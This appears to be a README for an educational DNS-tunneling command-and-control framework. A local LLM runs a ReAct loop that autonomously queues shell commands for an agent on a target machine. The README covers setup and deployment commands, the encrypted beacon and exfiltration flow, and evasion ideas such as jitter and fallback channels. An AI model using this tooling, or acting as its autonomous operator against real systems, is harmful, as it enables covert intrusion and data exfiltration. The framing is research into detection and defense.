# dns-c2
An educational DNS-based Command & Control framework featuring an autonomous LLM tasking engine.

> ⚠️ **Disclaimer:** This project is strictly for educational research and authorized lab environments. Do not deploy against systems you do not own or have explicit written permission to test. All components are designed for defensive understanding, network research, and cryptographic education.

## 🧠 Why This Exists
Built to understand:
- How covert DNS tunneling works at the packet & protocol level
- Cryptographic payload encapsulation (AES-256-GCM with nonce + auth tags)
- Autonomous agentic reasoning loops (ReAct pattern)
- Distributed state management across independent processes
- Real-world Git workflows (feature branching, fast-forward merges, semantic tagging)

## 🏗️ Architecture
```
Operator Console (cli.py) → Sets high-level goal and monitors history
            ↓
ReAct Engine (react_engine.py) → Reasons over history, queues next task
            ↓
queue_store.py → JSON-backed session/task/history persistence
            ↓
server.py → DNS listener (UDP :5555), decrypts payloads, routes tasks
            ↕ DNS Tunnel (TXT records)
agent.py → Beacon loop, executes commands, encrypts and returns results
```

## ✨ Features
- **DNS Tunneling**: Payloads encoded in custom DNS subdomains and TXT record responses
- **Strong Encryption**: AES-256-GCM with per-packet nonces and authentication tags
- **Autonomous Tasking**: ReAct loop (`Reason → Act → Observe`) powered by local LLM (`qwen3.5:9b` via Ollama)
- **File-Based State**: `sessions.json` enables cross-process synchronization without external databases
- **Protocol-Aware**: Handles DNS label limits (63B) with chunked payload transport
- **Zero-Install Agent**: Pure Python, no root required, outbound-only communication

## 📦 Prerequisites
- Python 3.12+
- [Ollama](https://ollama.com) with `qwen3.5:9b` (or compatible model)
- Two lab machines or isolated lab VMs (controller + target)
- Basic networking and Python fundamentals

## 🚀 Quick Start

### 1. Install Dependencies
```bash
pip install -r requirements.txt
```

### 2. Generate Shared Key
```bash
python3 -c "from cryptography.hazmat.primitives.ciphers.aead import AESGCM; import os; print(os.urandom(32).hex())" > .env.key
export C2_KEY=$(cat .env.key)
```

### 3. Start the C2 Server (Terminal 1)
```bash
python3 server.py
# Listens on UDP :5555 by default for lab testing.
```

### 4. Deploy the Agent (Target Machine)
```bash
export C2_KEY=$(cat .env.key)
export C2_SERVER=<your-server-ip>
export SESSION_ID=target-01
python3 agent.py
```

### 5. Create a Session and Run the ReAct Loop
```bash
python3 cli.py
# Choose [1] New session and enter SESSION_ID=target-01 plus goal/context fields
# Then choose [2] Launch ReAct loop
```

## 📁 Project Structure
```
dns-c2/
├── server.py          # DNS listener and packet handler
├── agent.py           # Beacon loop and command executor
├── queue_store.py     # JSON-backed session and task manager
├── react_engine.py    # LLM ReAct reasoning loop
├── crypto.py          # AES-256-GCM encrypt/decrypt utilities
├── cli.py             # Operator console for session management
├── sessions.json      # Runtime state persistence
└── README.md
```

## 🔍 How It Works
1. **Beacon**: Agent sends encrypted `READY` payload via DNS query (`<count>.<chunk...>.<session>.c2.local`)
2. **Decrypt & Route**: Server extracts session ID, decrypts payload, fetches next task from queue
3. **Execute**: Agent receives task, runs it locally, captures stdout/stderr
4. **Report**: Result is encrypted and sent back via DNS query
5. **Reason**: ReAct engine reads updated `sessions.json`, analyzes history, queues next logical command

## 🛡️ Detection & Evasion Notes
This PoC uses port `5555` and simple subdomain encoding for lab clarity. Real-world DNS tunneling research often explores:
- Jitter/randomized beacon intervals
- TTL randomization and query-type rotation (A/CNAME/TXT)
- Multi-query payload chunking and reassembly strategies
- Fallback transport channels for resiliency

## 📜 License
MIT License — See `LICENSE` for details.

## 🤝 Contributing
This is an educational project. Contributions should focus on:
- Protocol compliance and DNS RFC alignment
- Security hardening and cryptographic best practices
- Documentation and lab setup guides
- Defensive detection methodologies
